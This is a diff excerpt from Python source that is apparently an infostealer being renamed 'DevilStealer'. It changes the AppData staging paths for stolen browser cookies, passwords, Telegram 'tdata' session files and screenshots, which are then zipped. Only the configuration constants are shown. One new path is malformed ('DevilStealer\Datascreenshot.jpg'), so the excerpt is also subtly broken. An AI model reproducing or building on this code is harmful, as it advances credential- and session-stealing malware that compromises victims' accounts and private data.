@@ -12,11 +12,11 @@ from PIL import ImageGrab
 import datetime
 import zipfile
 
-FILE_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\interiumData"
-FILE_COOKIE = fr"C:\Users\{os.getlogin()}\AppData\Roaming\interiumData\cookie"
-FILE_PASSWORDS = fr"C:\Users\{os.getlogin()}\AppData\Roaming\interiumData\passwords"
-FILE_TG = fr"C:\Users\{os.getlogin()}\AppData\Roaming\interiumData\tdata"
-SCREENSHOT_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\interiumData\screenshot.jpg"
+FILE_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData"
+FILE_COOKIE = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\cookie"
+FILE_PASSWORDS = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\passwords"
+FILE_TG = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\tdata"
+SCREENSHOT_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealer\Datascreenshot.jpg"
 ZIP_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming"
 
 hasProgram = {
